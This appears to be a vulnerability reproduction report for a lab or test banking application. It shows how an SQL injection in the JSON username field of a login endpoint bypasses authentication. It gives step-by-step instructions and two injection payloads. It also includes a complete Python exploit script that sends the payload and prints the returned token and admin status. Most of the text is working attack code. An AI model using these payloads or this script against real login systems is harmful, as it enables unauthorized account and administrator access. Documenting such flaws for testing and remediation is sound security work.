To reproduce the vulnerability:

1. Send a POST request to http://bank:5000/login with Content-Type: application/json
2. Use a JSON payload with SQL injection in the username field:
   - {"username": "admin' OR '1'='1", "password": "anything"}
   - {"username": "admin'--", "password": "anything"}
3. The application will return a successful login response with a JWT token, indicating authentication bypass.
4. Use the received token to access protected endpoints and verify administrative privileges.

```
import requests
import json

def exploit_sql_injection():
    login_url = "http://bank:5000/login"
    headers = {"Content-Type": "application/json"}

    # Payload to bypass authentication
    payload = {
        "username": "admin' OR '1'='1",
        "password": "anything"
    }

    response = requests.post(login_url, headers=headers, json=payload)

    if response.status_code == 200:
        data = response.json()
        if data.get("status") == "success":
            print("Authentication bypass successful!")
            print(f"Token: {data.get('token')}")
            print(f"User ID: {data.get('debug_info', {}).get('user_id')}")
            print(f"Is Admin: {data.get('isAdmin')}")
            return data.get("token")
        else:
            print("Authentication failed.")
    else:
        print(f"Request failed with status code: {response.status_code}")

    return None

if __name__ == "__main__":
    token = exploit_sql_injection()
    if token:
        print("Use this token to access protected endpoints.")
